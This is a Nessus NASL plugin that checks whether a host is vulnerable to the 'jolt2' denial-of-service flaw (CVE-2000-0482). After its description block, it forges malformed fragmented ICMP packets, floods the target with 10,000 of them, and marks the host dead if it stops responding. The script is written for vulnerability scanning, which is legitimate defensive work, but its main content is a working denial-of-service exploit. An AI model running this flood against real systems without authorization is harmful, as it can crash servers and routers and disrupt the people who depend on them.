#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#
# Note: the original exploit looks buggy. I tried to reproduce it here.
#

if(description)
{
 script_id(11902);
 script_bugtraq_id(1312);
 script_version ("$Revision: 1.3 $");
 script_cve_id("CVE-2000-0482");

 name["english"] = "jolt2";
 script_name(english:name["english"]);
 
 desc["english"] = "
The machine (or a gateway on the network path) crashed when
flooded with incorrectly fragmented packets.
This is known as the 'jolt2' denial of service attack.

An attacker may use this flaw to shut down this server or router,
thus preventing you from working properly.

Solution : contact your operating system vendor for a patch.

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Floods target with incorrectly fragmented packets";
 script_summary(english:summary["english"]);
 
 if (ACT_FLOOD) script_category(ACT_FLOOD);
 else		script_category(ACT_KILL_HOST);
 
 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);

 exit(0);
}

#

src = this_host();
id = 0x455;
seq = rand() % 256;

ip = forge_ip_packet(ip_v: 4, ip_hl : 5, ip_tos : 0, ip_len : 20+8+1,
		     ip_id : id, ip_p : IPPROTO_ICMP, ip_ttl : 255,
		     ip_off : 8190, ip_src : src);

icmp = forge_icmp_packet(ip:ip, icmp_type:8, icmp_code:0,
	     		 icmp_seq: seq, icmp_id:seq, data: "X");

start_denial();

send_packet(icmp, pcap_active: 0) x 10000;

alive = end_denial();
if(!alive)
{
	security_hole();
	set_kb_item(name:"Host/dead", value:TRUE);
}
